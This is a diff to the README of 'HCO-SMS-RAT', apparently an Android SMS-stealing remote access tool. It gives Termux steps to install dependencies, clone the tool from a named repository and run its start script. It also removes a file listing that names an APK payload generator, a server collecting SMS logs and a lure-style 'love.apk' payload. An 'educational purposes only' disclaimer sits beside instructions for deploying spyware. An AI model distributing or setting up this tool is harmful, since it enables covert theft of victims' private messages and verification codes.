@@ -28,30 +28,12 @@
 pkg update && pkg upgrade -y
 pkg install python git curl -y
 pip install flask requests
-git clone https://github.com/YOUR_USERNAME/HCO-SMS-RAT
+git clone https://github.com/Hackerscolonyofficial/HCO-SMS-RAT.git
 cd HCO-SMS-RAT
 bash start.sh
 ```
 
 > 🚨 This tool is for **educational** and **awareness** purposes only.
-
----
-
-### 📁 File Structure
-
-```
-HCO-SMS-RAT/
-├── apk_builder.py      # APK payload generator
-├── main.py             # Flask server for SMS logs
-├── start.sh            # Auto-start script
-├── requirements.txt    # Python dependencies
-├── .gitignore
-├── README.md
-├── logo.png
-├── love.apk            # Final payload APK
-└── templates/
-    └── index.html      # Webhook page
-```
 
 ---
 
